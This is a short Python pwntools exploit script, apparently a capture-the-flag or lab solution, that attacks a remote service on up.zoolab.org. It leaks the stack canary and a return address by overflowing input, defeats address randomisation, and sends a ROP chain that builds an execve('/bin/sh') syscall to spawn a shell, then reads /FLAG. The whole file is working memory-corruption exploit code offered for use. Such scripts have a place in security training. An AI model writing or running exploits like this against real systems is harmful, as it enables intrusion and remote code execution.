#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
import sys

context.arch = 'amd64'
context.os = 'linux'

port = 10261

r = remote('up.zoolab.org', port)

datasec = 0xd0000

r.sendafter(b'? ',b'pass')

r.sendafter(b'? ', b'A' * 41)
r.recvuntil(b'A' * 41)
canary = r.recvuntil(b'\n')[:-1]
if len(canary) != 13:
    print('the length of the canary is not 13, try again!')
    exit(1)

r.sendafter(b'? ', b'A' * 56)
r.recvuntil(b'A' * 56)
RA = r.recvuntil(b'\n')[:-1]
ra_shift = int.from_bytes(RA, 'little') - int(0x8ad0)
rop_chain = [
    0x917f + ra_shift,
    datasec + ra_shift,
    0x94b1b + ra_shift,
    int.from_bytes(b"/bin/sh\x00", 'little'),
    0x3a5db + ra_shift,
    
    0x111ee + ra_shift,
    0,
    0x8dd8b + ra_shift,
    0,
    0,
    0x57187 + ra_shift,
    0x3b,
    0x567d5 + ra_shift
]
rop_chain = b''.join([v.to_bytes(8, 'little') for v in rop_chain])

r.sendafter(b': ', b'A' * 32 + b'\x01' + b'\x00' * 8 + canary + b'\x00\x00' + rop_chain)

r.sendafter(b'you!\n', b'cat /FLAG\n')

print(r.recvuntil(b'}'))
